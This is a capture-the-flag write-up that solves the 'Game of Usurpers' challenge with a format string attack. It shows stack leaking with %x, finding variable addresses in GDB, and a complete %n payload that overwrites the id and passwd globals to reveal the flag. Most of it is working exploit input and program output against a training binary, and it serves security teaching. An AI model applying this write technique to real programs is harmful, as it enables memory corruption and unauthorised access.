# Game of Usurpers

## Challenge 
> You said that you're our Emperor, but you just lost your crown while you were hunting. As a matter of fact, every nobles have their own ID and password. You have to tell us your ID and Password to prove your claim. 

>[Source.](game_of_usurpers.c)

## Hint
> What happens if you say something OTHER than yes or no?

## Solution

References

- https://github.com/zst-ctf/picoctf-2018-writeups/blob/master/Solved/authenticate/
- https://axcheron.github.io/exploit-101-format-strings/

### Format string attack

If we don't input either yes or no, it will print our input value


	$ while read -r line; do echo -e $line; done | ./game_of_usurpers
    You said that you're our Emperor, but you just lost your crown while you were hunting
    As a matter of fact, every nobles have their own ID and password
    And, you have to tell us your ID and Password to prove your claim. Would you? (yes/no)
    %1$x
    What are you mumbling about:

    804a1e7
    Sorry, you are not our Emperor! Go and never return, you liar!

Since we want to modify `id` and `passwd`, let's first find their address through GDB

	gdb-peda$ p &id
    $1 = (<data variable, no debug info> *) 0x804c04c <id>
    gdb-peda$ p &passwd
    $2 = (<data variable, no debug info> *) 0x804c050 <passwd>


For format string, we need to first find out what buffer area we can control to select the address of the `id` and `passwd` variables

	$ while read -r line; do echo -e $line; done | ./game_of_usurpers
    You said that you're our Emperor, but you just lost your crown while you were hunting
    As a matter of fact, every nobles have their own ID and password
    And, you have to tell us your ID and Password to prove your claim. Would you? (yes/no)
    %x %x %x %x %x %x %x %x %x %x %x %x
    What are you mumbling about:

    804a1e7 f7ede580 80493d1 0 0 f7f27000 ffeab934 0 534 3e8 25207825 78252078
    Sorry, you are not our Emperor! Go and never return, you liar!

So we can control offset 11 and upwards. All we need to do is put  `0x804c04c` (the address of `id`) and `0x804c050` (the address of `passwd`) in the offsets so that we can use `%n` to write to them.

	\x4c\xc0\x04\x08\x50\xc0\x04\x08%11$n%12$n

The result is like so

    $ while read -r line; do echo -e $line; done | ./game_of_usurpers
    You said that you're our Emperor, but you just lost your crown while you were hunting
    As a matter of fact, every nobles have their own ID and password
    And, you have to tell us your ID and Password to prove your claim. Would you? (yes/no)
    \x4c\xc0\x04\x08\x50\xc0\x04\x08%11$n%12$n
    What are you mumbling about:

    LP�
    Sorry, you are not our Emperor! Go and never return, you liar!

As you can see, we haven't succeeded in capturing the flag because the `id` has to be exactly `1234` and the `passwd` has to be exactly `5678`. We can ensure that those exact values are written to the addresses of those variables by padding the input with the correct size. Since the input already contains 8 bytes from the address, we need to pad it using `%1226x` so that the program will write 1226 + 8 = 1234 bytes to `id`. Then, we need to pad it again using `%4444x` so that the program will write 1234 + 4444 = 5678 bytes to `passwd`. The resulting attack string is as follows

    \x4c\xc0\x04\x08\x50\xc0\x04\x08%1226x%11$n%4444x%12$n

## Flag

	
	$ while read -r line; do echo -e $line; done | ./game_of_usurpers
    You said that you're our Emperor, but you just lost your crown while you were hunting
    As a matter of fact, every nobles have their own ID and password
    And, you have to tell us your ID and Password to prove your claim. Would you? (yes/no)
    \x4c\xc0\x04\x08\x50\xc0\x04\x08%1226x%11$n%4444x%12$n
    What are you mumbling about:

    LP






                                                                                                                   804a1e7



























                                                                                                                                      f7ecf580
    This way, Your Highness.
    CSCE604258{ha_ha_ha_ha}